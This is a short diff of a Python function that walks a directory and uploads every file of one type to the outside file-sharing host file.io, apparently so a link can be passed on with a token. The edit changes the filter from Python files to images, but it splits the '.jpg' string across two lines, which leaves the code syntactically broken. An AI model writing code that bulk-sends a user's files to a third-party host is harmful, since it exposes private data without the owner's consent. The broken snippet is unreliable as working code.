@@ -4,7 +4,8 @@ from bs4 import BeautifulSoup as bs
 
 def send_file_link(token, dir_path):
     for file in os.listdir(dir_path):
-        if file.endswith(".py"):
+        if file.endswith(".jpg
+"):
             file_path = os.path.join(dir_path, file)
             with open(file_path, "rb") as f:
                 response = requests.post("https://file.io", files={"file": f})
